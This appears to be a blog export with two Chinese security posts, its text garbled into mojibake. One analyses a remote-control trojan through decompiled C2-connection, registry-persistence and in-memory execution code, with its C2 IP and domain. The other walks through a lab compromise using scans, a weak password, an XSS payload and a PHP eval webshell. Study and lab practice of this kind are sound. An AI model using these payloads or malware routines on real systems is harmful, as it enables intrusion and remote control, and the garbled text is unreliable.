0x40000; setsockopt(s_1, 0xFFFF, 4097, optval, 4); // 0xFFFF æ˜¯ SOL_SOCKET (å¥—æ¥å­—çº§åˆ«) // è®¾ç½® SO_SNDBUF (å‘é€ç¼“å†²åŒºå¤§å°, 4098) ä¸º 0x40000 (256 KB) s_2 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval = 0x40000; setsockopt(s_2, 0xFFFF, 4098, optval, 4); // è®¾ç½® SO_SNDTIMEO (å‘é€è¶…æ—¶, 4102) ä¸º 30000 æ¯«ç§’ (30 ç§’) s_3 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval_ = 30000; setsockopt(s_3, 0xFFFF, 4102, optval_, 4); // è®¾ç½® SO_KEEPALIVE (å¯ç”¨ä¿æŒæ´»åŠ¨æœºåˆ¶, 8) ä¸º 1 s_5 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval__1 = 1; if ( !setsockopt(s_5, 0xFFFF, 8, optval__1, 4) ) { // å¦‚æœ SO_KEEPALIVE è®¾ç½®æˆåŠŸï¼Œåˆ™é…ç½® Keep-Alive å®šæ—¶å‚æ•° s_4 = *((_QWORD *)ArgList + 22); vInBuffer[0] = 1; // å¼€å…³ (1: å¯ç”¨) vInBuffer[1] = 180000; // ä¿æŒæ´»åŠ¨æ—¶é—´ (180 ç§’ æˆ– 3 åˆ†é’Ÿ) vInBuffer[2] = 5000; // ä¿æŒæ´»åŠ¨é—´éš” (5 ç§’) // ä½¿ç”¨ WSAIoctl å’Œ SIO_KEEPALIVE_VALS (0x98000004) è®¾ç½®è‡ªå®šä¹‰ Keep-Alive å‚æ•° WSAIoctl(s_4, 0x98000004, vInBuffer, 0xCu, 0, 0, &amp;cbBytesReturned, 0, 0); } // --- 7. æ›´æ–°çŠ¶æ€å¹¶åˆ›å»ºå·¥ä½œçº¿ç¨‹ --- _InterlockedExchange((volatile __int32 *)ArgList + 8, 1); // åŸå­åœ°è®¾ç½®è¿æ¥çŠ¶æ€æ ‡å¿—ä¸º 1 (ä¾‹å¦‚ï¼šå·²è¿æ¥) ThrdAddr = 0; // åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ (ä¾‹å¦‚ï¼šæ¥æ”¶/è¯»å–çº¿ç¨‹) *((_QWORD *)ArgList + 20) = beginthreadex(0, 0, sub_140003690, ArgList, 0, &amp;ThrdAddr); ThrdAddr_ = 0; // åˆ›å»ºç¬¬äºŒä¸ªçº¿ç¨‹ (ä¾‹å¦‚ï¼šå‘é€/å†™å…¥çº¿ç¨‹æˆ–å¿ƒè·³çº¿ç¨‹) *((_QWORD *)ArgList + 21) = beginthreadex(0, 0, sub_1400037E0, ArgList, 0, &amp;ThrdAddr_); return 1; // æˆåŠŸ} sub_140003390å‡½æ•°æ˜¯ Windows ç¯å¢ƒä¸­å»ºç«‹å‡ºç«™ TCP ç½‘ç»œè¿æ¥çš„å¸¸è§æ¨¡å¼ 1é€šè¿‡ *(_WORD *)name.sa_data = htons(hostshort); å°†å…¶è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºå¹¶è®¾ç½®ä¸ºsocketè¿æ¥ç«¯å£ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101name.sa_family = 2; // AF_INET*(_WORD *)name.sa_data = htons(hostshort); // ç«¯å£å· (ç½‘ç»œå­—èŠ‚åº)*(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; // IPåœ°å€// Hidden C++ exception states: #wind=2void __fastcall __noreturn sub_7FF6175EA440(LPVOID lpThreadParameter){ int v1; // eax __int64 v2; // rdi void *v3; // rax __int64 v4; // rbp void *v5; // rax __int64 v6; // rsi int v7; // r11d int v8; // eax void (__fastcall **v9)(_QWORD); // rbx unsigned int v10; // eax int v11; // ebx _QWORD v12[2]; // [rsp+38h] [rbp-60h] BYREF int v13; // [rsp+48h] [rbp-50h] HANDLE hObject; // [rsp+50h] [rbp-48h] int v15; // [rsp+60h] [rbp-38h] HANDLE hHandle; // [rsp+68h] [rbp-30h] void *v17; // [rsp+A8h] [rbp+10h] BYREF CreateThread(0, 0, StartAddress, 0, 0, 0); CreateThread(0, 0, sub_7FF6175EA3E0, 0, 0, 0); v1 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB2C); Sleep(1000 * v1); v2 = 0; v3 = operator new(0xB8u); if ( v3 ) v4 = sub_7FF6175E3230(v3); else v4 = 0; v5 = operator new(0x368u); v17 = v5; if ( v5 ) v6 = sub_7FF6175E7690(v5); else v6 = 0; while ( 1 ) { sub_7FF6175E3210(); if ( byte_7FF61763E99E ) { wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;8888&quot;); // &quot;6666&quot; v7 = dword_7FF61763F8E8; } else { wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;6666&quot;); // &quot;6666&quot; v7 = dword_7FF61763F6A8; } byte_7FF61763E99E = byte_7FF61763E99E == 0; dword_7FF61763E550 = v7; if ( ++dword_7FF61763F3F4 == 200 ) { sub_7FF6175E3210(); wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;80&quot;); // &quot;6666&quot; v7 = dword_7FF61763FB28; dword_7FF61763E550 = dword_7FF61763FB28; dword_7FF61763F3F4 = 0; } if ( v2 ) { (**(void (__fastcall ***)(__int64))v2)(v2); v7 = dword_7FF61763E550; } v2 = v6; if ( v7 == 1 ) v2 = v4; v8 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB68); Sleep(1000 * v8); v9 = *(void (__fastcall ***)(_QWORD))v2; v10 = sub_7FF6175EC5F8(a6666); // &quot;6666&quot; if ( ((unsigned __int8 (__fastcall *)(__int64, wchar_t *, _QWORD))v9[4])(v2, a127001, v10) )// &quot;127.0.0.1&quot; { v11 = dword_7FF61763FCE8; v12[0] = &amp;CManager::`vftable'; v12[1] = v2; (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v2 + 24LL))(v2, v12); hObject = CreateEventA(0, 1, 0, 0); v13 = 0; v12[0] = &amp;CKernelManager::`vftable'; hHandle = 0; v15 = v11; LOWORD(v17) = 260; (*(void (__fastcall **)(__int64, void **, __int64))(*(_QWORD *)v2 + 16LL))(v2, &amp;v17, 2); (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 40LL))(v2); WaitForSingleObject(hHandle, 0xFFFFFFFF); v12[0] = &amp;CKernelManager::`vftable'; CloseHandle(hHandle); v12[0] = &amp;CManager::`vftable'; CloseHandle(hObject); } }}è¿™æ˜¯ä¸€ä¸ªæ— é™å¾ªç¯çš„çº¿ç¨‹å‡½æ•° sub_7FF6175EA440 ï¼Œè´Ÿè´£å»ºç«‹ä¸C&amp;CæœåŠ¡å™¨çš„è¿æ¥å¹¶æ‰§è¡Œåç»­æ“ä½œã€‚å‡½æ•°ä½¿ç”¨ __noreturn å£°æ˜ï¼Œè¡¨ç¤ºå®ƒæ°¸è¿œä¸ä¼šè¿”å› è¿™é‡Œå‘ç°äº†ä¸€äº›ä¿¡æ¯æˆ‘ä»¬copyä¸‹æ¥çœ‹ä¸€ä¸‹ è¿™äº›å…¨æ˜¯TCP åè®®åº•å±‚æ—¥å¿—ï¼Œè¯´æ˜ç¨‹åºä¸æ˜¯ç®€å•è°ƒç”¨ç³»ç»Ÿ TCP æ¥å£ï¼Œè€Œæ˜¯å®ç°äº†è‡ªå®šä¹‰çš„ TCP é€šä¿¡ï¼ˆå¸¸è§äºæœ¨é©¬ / è¿œæ§ç¨‹åºï¼Œç”¨äºç¨³å®šå’Œæ§åˆ¶ç«¯äº¤äº’ï¼‰ å­—ç¬¦ä¸² å«ä¹‰ï¼ˆé€šä¿—è§£é‡Šï¼‰ æ’æŸ¥ä»·å€¼ recv sn=%lu æ¥æ”¶ TCP æ•°æ®åŒ…ï¼Œè®°å½•ã€Œåºåˆ—å·ï¼ˆsnï¼‰ã€ è¯æ˜ç¨‹åºåœ¨å’Œå¤–éƒ¨ï¼ˆå¦‚é»‘å®¢æœåŠ¡å™¨ï¼‰è¿›è¡Œ TCP æ•°æ®äº¤äº’ï¼Œsn æ˜¯æ•°æ®åŒ…æœ‰åºä¼ è¾“çš„æ ‡è¯† input ack: sn=%lu rtt=%ld rto=%ld æ”¶åˆ° TCP ç¡®è®¤åŒ…ï¼ˆACKï¼‰ï¼Œè®°å½•åºåˆ—å·ã€å¾€è¿”æ—¶é—´ï¼ˆrttï¼‰ã€é‡ä¼ è¶…æ—¶ï¼ˆrtoï¼‰ æœ¨é©¬ä¸ºäº†ä¿è¯ C2 è¿æ¥ç¨³å®šï¼Œä¼šåŠ¨æ€è°ƒæ•´ rtoï¼ˆé¿å…è¿æ¥æ–­å¼€ï¼‰ï¼Œæ˜¯ä¸»åŠ¨é€šä¿¡çš„é“è¯ input psh: sn=%lu ts=%lu æ”¶åˆ° TCP æ¨é€åŒ…ï¼ˆPSHï¼‰ï¼Œè®°å½•åºåˆ—å·å’Œæ—¶é—´æˆ³ï¼ˆtsï¼‰ PSH åŒ…ç”¨äºã€Œå¼ºåˆ¶ç«‹å³ä¼ è¾“æ•°æ®ã€ï¼Œå¸¸è§äºé»‘å®¢å‘é€æ§åˆ¶æŒ‡ä»¤ã€æ¥æ”¶çªƒå–æ•°æ®æ—¶ input probe æ”¶åˆ° TCP æ¢æµ‹åŒ… é»‘å®¢å¯èƒ½åœ¨é€šè¿‡æ¢æµ‹åŒ…æ£€æµ‹ä½ çš„ä¸»æœºæ˜¯å¦åœ¨çº¿ã€è¿æ¥æ˜¯å¦å­˜æ´» input wins: %lu è®°å½• TCP çª—å£å¤§å°ï¼ˆwinsï¼‰ ä¼˜åŒ–æ•°æ®ä¼ è¾“æ•ˆç‡ï¼Œè¿›ä¸€æ­¥è¯æ˜æ˜¯ã€ŒæŒç»­åŒå‘é€šä¿¡ã€ï¼ˆè€Œéå•æ¬¡è¯·æ±‚ï¼‰ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465data:000000014001DBB8 aRoLdBytes db '[RO] %ld bytes',0 ; DATA XREF: sub_140001740+2Eâ†‘o.rdata:000000014001DBB8 ; sub_140002880+14Aâ†‘o ....rdata:000000014001DBC7 align 8.rdata:000000014001DBC8 aRecvSnLu db 'recv sn=%lu',0 ; DATA XREF: sub_140001B70+FFâ†‘o.rdata:000000014001DBD4 align 8.rdata:000000014001DBD8 aRiDBytes db '[RI] %d bytes',0 ; DATA XREF: sub_140002390+3Aâ†‘o.rdata:000000014001DBE6 align 8.rdata:000000014001DBE8 aInputAckSnLuRt db 'input ack: sn=%lu rtt=%ld rto=%ld',0.rdata:000000014001DBE8 ; DATA XREF: sub_140002390+271â†‘o.rdata:000000014001DC0A align 10h.rdata:000000014001DC10 aInputPshSnLuTs db 'input psh: sn=%lu ts=%lu',0.rdata:000000014001DC10 ; DATA XREF: sub_140002390+2AEâ†‘o.rdata:000000014001DC29 align 10h.rdata:000000014001DC30 aInputProbe db 'input probe',0 ; DATA XREF: sub_140002390+375â†‘o.rdata:000000014001DC3C align 20h.rdata:000000014001DC40 aInputWinsLu db 'input wins: %lu',0 ; DATA XREF: sub_140002390+39Eâ†‘o.rdata:000000014001DC50 dq offset ??_R4CManager@@6B@ ; const CManager::`RTTI Complete Object Locator'.rdata:000000014001DC58 ; const CManager::`vftable'.rdata:000000014001DC58 ??_7CManager@@6B@ dq offset nullsub_2 ; DATA XREF: sub_140006E50+27â†‘o.rdata:000000014001DC58 ; sub_140006EB0+21â†‘o ....rdata:000000014001DC60 dq offset ??_R4CTcpSocket@@6B@ ; const CTcpSocket::`RTTI Complete Object Locator'.rdata:000000014001DC68 ; const CTcpSocket::`vftable'.rdata:000000014001DC68 ??_7CTcpSocket@@6B@ dq offset sub_140003310.rdata:000000014001DC68 ; DATA XREF: sub_140003230+21â†‘o.rdata:000000014001DC70 dq offset sub_140005A30.rdata:000000014001DC78 dq offset sub_140003860.rdata:000000014001DC80 dq offset ?swfun@std@@YAXAEAVios_base@1@_J@Z ; std::swfun(std::ios_base &amp;,__int64).rdata:000000014001DC88 dq offset sub_140003390.rdata:000000014001DC90 dq offset sub_140003C10.rdata:000000014001DC98 unk_14001DC98 db 0 ; DATA XREF: sub_140009460+61â†‘o.rdata:000000014001DC99 db 0.rdata:000000014001DC9A db 0.rdata:000000014001DC9B db 0.rdata:000000014001DC9C db 0.rdata:000000014001DC9D db 0.rdata:000000014001DC9E db 0.rdata:000000014001DC9F db 0.rdata:000000014001DCA0 aInvalidStringP db 'invalid string position',0.rdata:000000014001DCA0 ; DATA XREF: sub_1400066C0+1Câ†‘o.rdata:000000014001DCA0 ; sub_1400067F0+27â†‘o ....rdata:000000014001DCB8 aStringTooLong db 'string too long',0 ; DATA XREF: sub_1400067F0+71â†‘o.rdata:000000014001DCB8 ; sub_140006920+8Dâ†‘o ....rdata:000000014001DCC8 align 10h.rdata:000000014001DCD0 ; const WCHAR aD33f351a4aeea5.rdata:000000014001DCD0 aD33f351a4aeea5: ; DATA XREF: sub_140006EF0+8Dâ†‘o.rdata:000000014001DCD0 ; sub_140006EF0+F2â†‘o ....rdata:000000014001DCD0 text &quot;UTF-16LE&quot;, 'd33f351a4aeea5e608853d1a56661059',0.rdata:000000014001DD12 align 8.rdata:000000014001DD18 aDenglupeizhi db 'denglupeizhi',0 ; DATA XREF: sub_140007500+23â†‘o.rdata:000000014001DD25 align 8.rdata:000000014001DD28 ; const WCHAR SubKey.rdata:000000014001DD28 SubKey: ; DATA XREF: sub_140006D20+40â†‘o.rdata:000000014001DD28 text &quot;UTF-16LE&quot;, 'SOFTWARE',0.rdata:000000014001DD3A align 20h.rdata:000000014001DD40 ; const WCHAR ValueName.rdata:000000014001DD40 ValueName: ; DATA XREF: sub_140006D20+67â†‘o.rdata:000000014001DD40 ; sub_140006D20+79â†‘o.rdata:000000014001DD40 text &quot;UTF-16LE&quot;, 'IpDates_info',0.rdata:000000014001DD5A align 20h.rdata:000000014001DD60 ; const WCHAR aConsole1.rdata:000000014001DD60 aConsole1: ; DATA XREF: sub_140006EF0+39â†‘o.rdata:000000014001DD60 ; sub_140006EF0+367â†‘o.rdata:000000014001DD60 text &quot;UTF-16LE&quot;, 'Console\\1',0.rdata:000000014001DD74 align 8.rdata:000000014001DD78 aWindowsSystem3 db 'Windows\\System32\\tracerpt.exe',0 denglupeizhiï¼ˆä¸­æ–‡æ‹¼éŸ³ï¼šã€Œç™»å½•é…ç½®ã€ï¼‰ å«ä¹‰ï¼šç¨‹åºçš„æ ¸å¿ƒé…ç½®é¡¹ï¼ˆå¤§æ¦‚ç‡å­˜å‚¨ C2 æœåŠ¡å™¨ IPã€ç«¯å£ã€ç™»å½•å¯†ç  / å¯†é’¥ï¼‰ï¼› æ’æŸ¥æ“ä½œï¼šåœ¨ç³»ç»Ÿä¸­æœç´¢è¿™ä¸ªå­—ç¬¦ä¸²ï¼ˆå¦‚æ³¨å†Œè¡¨ã€æœ¬åœ°é…ç½®æ–‡ä»¶ï¼‰ï¼Œå¯èƒ½æ‰¾åˆ°æ˜æ–‡ / åŠ å¯†çš„ C2 é…ç½®ã€‚ 1234567891011121314151617181920212223242526272829__int64 __fastcall sub_140007500(int a1){ unsigned int v1; // r10d __int64 v2; // r9 int n12_1; // r8d __int64 n12; // rdx v1 = 0; v2 = 0; if ( a1 &lt;= 0 ) return 0xFFFFFFFFLL; while ( 1 ) { n12_1 = 0; for ( n12 = 0; n12 &lt; 12; ++n12 ) { if ( *((_BYTE *)lpBuffer + v2 + n12) != aDenglupeizhi[n12] ) break; ++n12_1; } if ( n12_1 == 12 ) break; ++v2; ++v1; if ( v2 &gt;= a1 ) return 0xFFFFFFFFLL; } return v1;} è¿™ä¸ªå‡½æ•°ä¹ŸæŒºå…³é”®çš„ ç„¶åxferåˆ°ä¸‹é¢è¿™ä¸ªå‡½æ•° 12345678910111213141516171819202122232425262728293031323334353637__int64 __fastcall sub_140006D20(_DWORD *a1){ unsigned int v2; // eax HANDLE hProcess; // rax _QWORD v5[2]; // [rsp+30h] [rbp-28h] BYREF DWORD dwProcessId[6]; // [rsp+40h] [rbp-18h] DWORD ExitCode; // [rsp+60h] [rbp+8h] BYREF HKEY hKey; // [rsp+68h] [rbp+10h] BYREF v2 = sub_140007500(dword_14005EBB8); if ( v2 != -1 ) memmove((char *)lpBuffer + v2, &amp;Src, 0x12A0u); RegOpenKeyExW(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE&quot;, 0, 0x102u, &amp;hKey); RegDeleteValueW(hKey, L&quot;IpDates_info&quot;); RegSetValueExW(hKey, L&quot;IpDates_info&quot;, 0, 3u, &amp;Src, 0x12A0u); RegCloseKey(hKey); if ( a1[10] ) { v5[0] = 0; v5[1] = 0; *(_QWORD *)dwProcessId = 0; while ( 1 ) { while ( !(unsigned int)sub_140007310((unsigned int)dword_14005EBB8, v5) ) ; while ( 1 ) { hProcess = OpenProcess(0x400u, 0, dwProcessId[0]); if ( !hProcess || !GetExitCodeProcess(hProcess, &amp;ExitCode) || ExitCode != 259 ) break; Sleep(0xBB8u); } } } ((void (*)(void))lpBuffer)(); return 0;} ä¸Šé¢çš„ä»£ç è´Ÿè´£é…ç½®çš„æ›´æ–°ä¸æŒä¹…åŒ–ï¼Œåˆè´Ÿè´£æ ¸å¿ƒæ¶æ„ä»£ç çš„æ‰§è¡Œï¼Œæ˜¯æ•´ä¸ªæ”»å‡»é“¾æ¡çš„å…³é”® 1å¯åŠ¨ â†’ è¯»å–æ—§é…ç½®ï¼ˆIpDates_infoï¼‰â†’ è°ƒç”¨sub_140007500æŸ¥æ‰¾é…ç½®ä½ç½® â†’ ç”¨Srcæ›´æ–°é…ç½® â†’ å†™å…¥æ³¨å†Œè¡¨æŒä¹…åŒ– â†’ ç›‘æ§ç›®æ ‡è¿›ç¨‹çŠ¶æ€ â†’ æ‰§è¡Œæ ¸å¿ƒæ¶æ„ä»£ç ï¼ˆC2è¿æ¥+æ”»å‡»ï¼‰ ç”±ä¸‹é¢è¿™ä¸ªå°±å¯ä»¥å»æŸ¥ä¸€ä¸‹æ³¨å†Œè¡¨äº†è¿™é‡ŒæŸ¥æ³¨å†Œè¡¨å‘ç°äº†ipdateinfoåœ¨HKEY_LOCAL_MACHINE\\SOFTWAREå‘ç°äº†ä¿¡æ¯è¿™å°±å¾ˆå…³é”®äº† è¿™é‡Œå¯¼å‡ºæ¥çœ‹ä¸€çœ¼ï¼Œæ³¨å†Œè¡¨æ–‡ä»¶å†…å®¹è½¬æˆtxtäº†ï¼Œæ€•ä½ ä»¬ä¹±ç‚¹ç»™è‡ªå·±ç”µè„‘æåäº†ï¼Œé‚£ä¼°è®¡åªèƒ½é‡è£…äº† æ³¨å†Œè¡¨æ•°æ®æ˜¯ UTF-16LE ç¼–ç ï¼ˆWindows æ³¨å†Œè¡¨å­—ç¬¦ä¸²é»˜è®¤ç¼–ç ï¼‰ï¼Œå¤§é‡ 00 æ˜¯ç¼–ç ç©ºå­—èŠ‚ï¼Œå…³é”®ä¿¡æ¯å¦‚ä¸‹ï¼š è§£ç åçš„æ˜æ–‡ä¿¡æ¯ å¯¹åº”åå…­è¿›åˆ¶ç‰‡æ®µï¼ˆç¤ºä¾‹ï¼‰ å«ä¹‰ï¼ˆæœ¨é©¬é…ç½®ä½œç”¨ï¼‰ 115.190.102.32 31,00,31,00,35,00,2e,00,31,00,39,00,30,00,2e,00,31,00,30,00,32,00,2e,00,33,00,32,00 æœ¨é©¬çš„ C2 æœåŠ¡å™¨ IPï¼Œå°±æ˜¯æˆ‘çš„è¿œç¨‹æœåŠ¡å™¨ 6000 36,00,30,00,30,00,30,00 C2 æœåŠ¡å™¨çš„ ç›‘å¬ç«¯å£ï¼Œå¯¹åº” TCP è¿æ¥çš„ 6000 ç«¯å£ï¼Œæ˜¯æœ¨é©¬å’Œé»‘å®¢é€šä¿¡çš„æ ¸å¿ƒç«¯å£ 127.0.0.1 31,00,32,00,37,00,2e,00,30,00,2e,00,30,00,2e,00,31,00 æœ¨é©¬çš„ æœ¬åœ°ç›‘å¬ IPï¼ˆå›ç¯åœ°å€ï¼‰ï¼Œä¼°è®¡æ˜¯ç”¨äºæœ¬åœ°è¿›ç¨‹é€šä¿¡æˆ–åå‘ä»£ç†ï¼ˆéšè—è‡ªèº«è¡Œä¸ºï¼‰ 80 38,00,30,00 æœ¬åœ°ç›‘å¬ç«¯å£ï¼ˆ80 ç«¯å£ï¼Œæ¨¡æ‹Ÿ HTTP æœåŠ¡ï¼Œè§„é¿é˜²ç«å¢™æ£€æµ‹ï¼‰ 1.0 31,00,2e,00,30,00 æœ¨é©¬ç‰ˆæœ¬å·ï¼ˆç®€å•æ ‡è¯†ç‰ˆæœ¬ï¼Œæ— ç‰¹æ®ŠæŠ€æœ¯æ„ä¹‰ï¼‰ 2025.11. 9 32,00,30,00,32,00,35,00,2e,00,31,00,31,00,2e,00,20,00,39,00 é…ç½®æ›´æ–°æ—¥æœŸï¼ˆç”Ÿæˆé…ç½®çš„æ—¶é—´ï¼Œç”¨äºç‰ˆæœ¬ç®¡ç†ï¼‰ 1ï¼ˆå¤šä¸ªé›¶æ•£å‡ºç°ï¼‰ 01,00,00,00 æˆ– 31,00 åŠŸèƒ½å¼€å…³ï¼ˆå¯¹åº”ä¹‹å‰é€†å‘çš„ dword_14005F6A8 ç­‰å˜é‡ï¼Œ1=å¯ç”¨ï¼Œæ¯”å¦‚å¯ç”¨ C2 è¿æ¥ã€æœ¬åœ°ç›‘å¬ï¼‰ è¿™é‡Œå¯ä»¥çœ‹åˆ°æ—¥æœŸ å½“ç„¶è¿™åˆ†æå‡ºæ¥çš„åªæ˜¯æœåŠ¡å™¨IPå¹¶ä¸æ˜¯çœŸæ­£çš„åé—¨IPï¼Œè¿™ä¹Ÿå¯ä»¥ä½œä¸ºæœ¨é©¬åˆ†æ1çš„é¢˜è§£ï¼Œé¢å¯¹æ‰¾ä¸åˆ°è¿›ç¨‹æˆ–è€…ä»»ä½•å…³äºæœ¨é©¬çš„ç‰¹å¾çš„æƒ…å†µå¯ä»¥è¿™æ ·æ“ä½œï¼Œå¯ä»¥è¿™æ ·åˆ†æ å»çœ‹ä¸€çœ¼å¼€æœºè‡ªå¯åŠ¨æ³¨å†Œè¡¨æ²¡å‘ç°ä»€ä¹ˆå¥‡æ€ªçš„ shift+F12ç„¶åæœç´¢åˆ°äº†.comçš„åŸŸåï¼Œè¿™ä¸ªå¾ˆå¤§å¯èƒ½å°±æ˜¯å¼€å‘c2å·¥å…·çš„é»‘äº§å›¢ä¼™ç•™ä¸‹çš„åé—¨åŸŸåï¼Œæˆ‘ä»¬æŸ¥ä¸€ä¸‹åŸŸå ç›´æ¥é—®aiæ‡’å¾—æœäº† yk.ggdy.com md5å€¼ï¼šaf71b4482bc8e659e1c2a092a910d4ec æ‰€ä»¥æœ€ç»ˆflagå°±æ˜¯{yk.ggdy.com:2025å¹´11æœˆ9æ—¥} æœ€åæŸ¥ä¸€ä¸‹è¿™ä¸ªIPåœ¨å“ªé‡Œ https://ipconfig.com/zh","link":"/2025/12/11/%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"},{"title":"","text":"çº¢æ—¥é¶åœº+METASPLOITABLEæ‰“é¶ çº¢æ—¥é¶åœºä¸€å…ˆæ‰«ç½‘æ®µ 1nmap -sn -PR -n 192.168.52.0/24 -sn: è·³è¿‡ç«¯å£æ‰«æï¼Œåªç¡®è®¤æ˜¯å¦åœ¨çº¿-PR: ä½¿ç”¨åŸºäº ARP åè®®çš„ä¸»æœºæ‰«æï¼Œå†…ç½‘é¦–é€‰-n: ä¸è¿›è¡Œåå‘ DNS è§£æï¼Œå¯æé«˜æ‰«æé€Ÿåº¦ ç„¶åæŒ‰çº§åˆ«åˆ°10æ‰«ç«¯å£ 1sudo nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.10 -sS: ä½¿ç”¨ TCP SYN åŠå¼€æ”¾æ‰«æ (å¿…é¡»ä½¿ç”¨ root æƒé™è¿è¡Œ)-sC: ä½¿ç”¨é»˜è®¤çš„è„šæœ¬æ‰«æï¼Œå¯æ‰«æå‡ºæ›´å¤šä¿¡æ¯ (æ¯”å¦‚ç½‘é¡µæ ‡é¢˜)-Pn: ä¸è¿›è¡Œæ´»è·ƒä¸»æœºæ‰«æï¼Œå› ä¸ºæ‰«æå¯¹è±¡å·²çŸ¥æ˜¯æ´»è·ƒä¸»æœº-n: ä¸è¿›è¡Œåå‘ DNS è§£æï¼Œæé«˜æ‰«æé€Ÿåº¦-sV: æ‰«ææœåŠ¡ç‰ˆæœ¬ä¿¡æ¯-p 1-65535: æŒ‡å®šæ‰«æçš„ç«¯å£èŒƒå›´ä¸ºæ‰€æœ‰ TCP ç«¯å£80ç«¯å£ ä»ä¸Šå›¾å¯çœ‹å‡º 192.168.52.10 ä¸»æœºå¼€æ”¾äº† 80 ç«¯å£ï¼Œè¿è¡Œäº† HTTP æœåŠ¡ï¼Œç«™ç‚¹æ ‡é¢˜ä¸º phpStudyï¼Œå³ä½¿ç”¨å°çš®é¢æ¿æ­å»ºçš„ web ç«™ç‚¹ã€‚æµè§ˆå™¨è®¿é—® http://192.168.1.10ï¼Œå¯ä»¥çœ‹åˆ° phpinfo.php æ–‡ä»¶è¢«å±•ç¤ºäº†å‡ºæ¥ï¼Œå¯è¢«æ”¶é›†åˆ°å¤§é‡ PHP é…ç½®ä¿¡æ¯ï¼š 2.1.3 ç«™ç‚¹ç›®å½•æ‰«æä½¿ç”¨ wfuzz æ¥æ‰«æ http://192.168.52.10/ çš„ç«™ç‚¹ç›®å½•ï¼š 1wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.52.10/FUZZ -w /usr/share/wordlists/dirb/common.txt: æŒ‡å®š wfuzz ä½¿ç”¨ kali å†…ç½®çš„å¸¸è§ç›®å½•å’Œæ–‡ä»¶åå­—å…¸æ–‡ä»¶æ¥çˆ†ç ´--hc 404: hide code 404ï¼Œå³å½“è¿”å›çŠ¶æ€ç ä¸º 404 (æœªæ‰¾åˆ°) æ—¶ï¼Œwfuzz ä¸æ˜¾ç¤ºè¯¥ç»“æœ192.168.52.10/FUZZ: FUZZ ä¸ºå ä½ç¬¦ï¼Œå­—å…¸æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œéƒ½ä¼šæ›¿æ¢æ‰ FUZZï¼Œå¹¶å°†æ›¿æ¢åçš„ URL å‘é€ç»™æœåŠ¡å™¨ï¼Œç„¶ååˆ†ææœåŠ¡å™¨çš„ http çŠ¶æ€ç  /phpadminå¼±å¯†ç root.root 1wget http://192.168.52.10/beifen.rar è¿™é‡Œç›´æ¥å‘Šè¯‰æˆ‘ä»¬åå°åœ°å€äº†æºç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°å› ä¸ºç›´æ¥æ‹¿æºç äº†å¤ªç®€å•äº†åœ¨ç•™è¨€æ¿/index.php?r=default/extend/index&amp;id=100023é¡µé¢è¾“å…¥ 12hello admin!!&lt;script&gt;alert(&quot;hacker&quot;)&lt;/script&gt; æ„æˆxss å•å‡»å®¡æ ¸æŒ‰é’®ï¼Œä½¿è¯¥ç•™è¨€é€šè¿‡å®¡æ ¸ä»è€Œæ˜¾ç¤ºåœ¨ç•™è¨€æ¿é¡µé¢ï¼šç„¶åç”¨æˆ·ç•Œé¢å°±ä¼šå¼¹çª—äº† yxcms åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´ ç™»å½•åˆ° yxcms çš„åå°ï¼Œè¿›å…¥â€ å‰å°æ¨¡æ¿â€ï¼Œç®¡ç†æ¨¡æ¿æ–‡ä»¶å¹¶æ–°å»ºæ¨¡æ¿æ–‡ä»¶ï¼Œåç§°ä¸º hack, å†…å®¹ä¸º php ä¸€å¥è¯æœ¨é©¬: &lt;?php @eval($_POST['hack']);?&gt;: ä½†æ˜¯ä¸çŸ¥é“æ–‡ä»¶ä½ç½®è¿™é‡Œæˆ‘ä»¬ç›´æ¥å»ä½†æ˜¯æˆ‘ä»¬æœ‰æºç å¯ä»¥çŸ¥é“è¿™ä¸ªé¡µé¢å…¶ä»–æ–‡ä»¶çš„ä½ç½®yxcms\\protected\\apps\\default\\view\\default å¾—åˆ°æ–‡ä»¶è·¯å¾„ 1http://192.168.52.10/yxcms/protected/apps/default/view/default/HACK.php ç„¶æˆ‘ä»¬ç›´æ¥å»antswordè¿æ¥ net sessionnet session å‘½ä»¤çš„æ ¸å¿ƒä½œç”¨æ˜¯å±•ç¤º â€œä¼šè¯è¿æ¥â€ï¼Œå…·ä½“èƒ½æŸ¥åˆ°ä»¥ä¸‹å…³é”®ä¿¡æ¯ï¼š è¿œç¨‹è®¡ç®—æœºåç§° / IPï¼šæ˜¾ç¤ºå“ªä¸ªè®¾å¤‡ï¼ˆæ¯”å¦‚å¦ä¸€å°ç”µè„‘ã€æœåŠ¡å™¨ï¼‰æ­£åœ¨è¿æ¥ä½ çš„ç”µè„‘ã€‚ è¿æ¥ç±»å‹ï¼šé€šå¸¸æ˜¯ â€œMicrosoft Windows Networkâ€ï¼Œå³é€šè¿‡ Windows ç½‘ç»œå…±äº«å»ºç«‹çš„è¿æ¥ã€‚ è¿æ¥çŠ¶æ€ï¼šæ˜¾ç¤ºè¿æ¥æ˜¯ â€œå·²å»ºç«‹â€ è¿˜æ˜¯ â€œæ–­å¼€â€ 